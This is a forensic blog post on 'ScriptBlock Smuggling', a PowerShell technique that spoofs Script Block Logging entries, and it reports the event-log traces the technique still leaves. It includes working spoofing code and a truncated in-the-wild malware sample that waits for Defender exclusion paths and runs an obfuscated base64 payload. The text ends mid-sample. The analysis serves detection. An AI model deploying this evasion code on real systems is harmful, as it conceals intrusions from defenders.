---
title: ScriptBlock Smuggling
url: https://dfir.ch/posts/scriptblock_smuggling/
source: Over Security - Cybersecurity news aggregator
date: 2024-09-14
fetch_date: 2025-10-06T18:29:35.377880
---

# ScriptBlock Smuggling

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# ScriptBlock Smuggling

13 Sep 2024

**Table of Contents**

* [Introduction](#introduction)
* [Testing](#testing)
* [Testing Results](#testing-results)
* [And the attackers?](#and-the-attackers)
* [AMSI / Windows Defender](#amsi--windows-defender)
* [Conclusion](#conclusion)

## Introduction

PowerShell’s Script Block Logging is a security feature that records and logs the contents of all scripts and commands executed within PowerShell. This includes both legitimate administrative scripts and potentially malicious commands. When enabled, Script Block Logging generates detailed logs stored in the Windows Event Log under `Microsoft-Windows-PowerShell/Operational`.

I have previously tweeted several times about PowerShell and why monitoring the executed PowerShell scripts is so important. A few of these tweets are listed [here](https://dfir.ch/tweets/dfir/#powershell).

Within PowerShell Script Block Logging, we distinguish three types:

* **Script Block Logging**: Captures and logs the content of all script blocks (scripts and commands) executed within PowerShell.
* **Module Logging**: Logs activities performed by PowerShell modules, which can help monitor specific cmdlet usage. In our lab, we set the list of logged modules to “\*”, meaning we log everything that happens in a PowerShell session. This will come in handy later on.
* **Transcript Logging**: Records a full transcript of all PowerShell sessions, including input and output, in plain text files.

Recently, [BC-Security](https://bc-security.org) presented a new technique with which PowerShell code can be executed in such a way that it no longer appears in the script block log:

*ScriptBlock Smuggling allows an attacker to spoof any arbitrary message into the ScriptBlock logs while bypassing AMSI. To make things more interesting, it also does not require any reflection or memory patching to be executed.*

In this blog post, we take a closer look at this technique, particularly which forensic traces we find when attackers utilize ScriptBlock Smuggling. For a better understanding of the technique, the original [blog post](https://bc-security.org/scriptblock-smuggling/) from BC-Security should be read first, as this blog post here only deals with testing the technique and the resulting forensic artifacts.

## Testing

First, we activate the various PowerShell script logging options in our lab to collect as many PowerShell forensic traces as possible. [Configure PowerShell logging](https://docs.splunk.com/Documentation/UBA/5.4.0/GetDataIn/AddPowerShell) from Splunk is a good reference. Next, [AtomicsonaFri](https://x.com/AtomicsonaFri) announced on X a new AtomicRedTeam test for ScriptBlock Smuggling (the original post can be found [here](https://x.com/AtomicsonaFri/status/1803163883726905428))

![AtomicRedTeam Test for ScriptBlock Smuggling](/images/scriptblock_smuggling/atomic.png "AtomicRedTeam Test for ScriptBlock Smuggling")

Figure 1: AtomicRedTeam Test for ScriptBlock Smuggling

[Here](https://gist.githubusercontent.com/MHaggis/0919408d5e14017adad05a74b9aaba01/raw/9c6ca2a823c6bb975bf7908111834e9d8d9bc36f/ScriptBlockSmuggling.yaml) is the linked gist to the AtomicRedTeam test from the tweet above, copied out for further reference:

```
- name: ScriptBlock Smuggling
  description: This test demonstrates the use of ScriptBlock Smuggling to spoof PowerShell logs.
  supported_platforms:
  - windows
  input_arguments:
    spoofed_command:
      description: The benign command to be logged.
      type: string
      default: Write-Output 'Hello'
    executed_command:
      description: The actual command to be executed.
      type: string
      default: Write-Output 'World'
  executor:
    name: powershell
    command: |
      $SpoofedAst = [ScriptBlock]::Create("#{spoofed_command}").Ast
      $ExecutedAst = [ScriptBlock]::Create("#{executed_command}").Ast
      $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
         $null,
         $null,
         $null,
         $ExecutedAst.EndBlock.Copy(),
         $null)
      $Sb = $Ast.GetScriptBlock()
      $Sb.Invoke()
```

And here is the code we will use in our test scenario. We write `Nothing to see here :)` to the standard output, and this code will be our “cover up” for the code that downloads the icon from this webpage (dfir.ch).

Again, `$SpoofedAst` will be the cover-up code, and `$ExecutedAst` will execute something malicious in a real-life scenario.

```
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Nothing to see here :)'").Ast
$ExecutedAst = [ScriptBlock]::Create("Invoke-WebRequest 'https://dfir.ch/favicon.ico'
-OutFile 'C:\Users\Public\favicon.ico'").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
  $null,
  $null,
  $null,
  $ExecutedAst.EndBlock.Copy(),
  $null)
$Sb = $Ast.GetScriptBlock()
$Sb.Invoke()
```

## Testing Results

**Powershell Script Block Logging**

Here is the logged code, which we defined in the variable `$SpoofedAst` above (Event 4104 is Powershell Script Block Logging):

![$SpoofedAst code](/images/scriptblock_smuggling/event_4104_spoofed.png "$SpoofedAst code")

Figure 2: $SpoofedAst code

However.. it might be correct that we don’t see an entry for the Script Block belonging to the `$ExecutedAst` variable, but:

![$ExecutedAst code](/images/scriptblock_smuggling/event_4104_original.png "$ExecutedAst code")

Figure 3: $ExecutedAst code

The whole code used to disguise our malicious actions was captured! So what’s that technique really used for? Just to.. well.. kind of spoof - hide - deceive - our actions? X user [SerkinValery](https://x.com/SerkinValery/) also pointed out this flaw (?) in the attack chain ([Source](https://x.com/SerkinValery/status/1804751034666938502)).

**Powershell Module Logging**

This Smuggling attack would only trick the logging in the Script Block Log, `EventID 4104`. However, we also enabled `Event ID 4103 â Module logging`, which also captures evidence of the executed PowerShell code on our machine. As the module log might not be as comfortable to read or parse from a monitoring standpoint, we still could find evidence of an infection chain or an ongoing attack.

![Powershell Module Logging](/images/scriptblock_smuggling/event_4103_webrequest.png "Powershell Module Logging")

Figure 4: Powershell Module Logging

## And the attackers?

Nasreddine posted the following [tweet](https://x.com/nas_bench/status/1806628233565155506) on X:

![@nas_bench’s tweet on X](/images/scriptblock_smuggling/nas_bench.png "@nas_bench's tweet on X")

Figure 5: @nas\_bench's tweet on X

A truncated version of the full [“Play along”](https://gist.githubusercontent.com/nasbench/687de6111f0e826563f8bb1c36ae9430/raw/b44eeec94795df7e221047d36d19902dc249f00b/1-Smuggling-VT-Sample.ps1) gist is depicted below:

```
function FxC {
    param (
        [string]$p
    )
    $x = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    return $x -contains $p
}

$z1 = "$env:USERPROFILE\AppData"
$z2 = "C:\ProgramData"

do {
    Start-Sleep -Seconds 1
} until ((FxC -p $z1) -and (FxC -p $z2))

$x2fM3d = [ScriptBlock]::Create(("G"+"et-"+"Da"+"te"))
$w9eR1a = ("ZgB1AG4AYwB0AGkAbwBuACAAQQB7AHAAYQByAGEAbQAoACQAeAApADsAJABiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACgAJAB4AC4ATABlAG4AZwB0AGgALwAyACkAOwBmAG8AcgAoACQAaQA9ADAAOwAkAGkALQBsAHQAJABiAC4ATABlAG4AZwB0AGgAOwAkAGkAKwArACkAewAkAGIAWwAkAGkAXQA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAeAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABpACoAMgAsADIAKQAsADEANgApAH0AOwAkAGIAfQAKAGYAdQBuAGMAdABpAG8
[...]
CQARAA7AAoA")
$y6uL4q = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($w9eR1a))
$k3mV5x = [ScriptBlock]::Create($y6uL4q)
$j4bN2t = $x2fM3d.Ast
$z7qX1w = $k3mV5x.Ast
$h9gP3d = $j4bN2t.Copy()
$v2mL4k = $z7qX1w.EndBlock.Copy()
$s1dR6j = [S...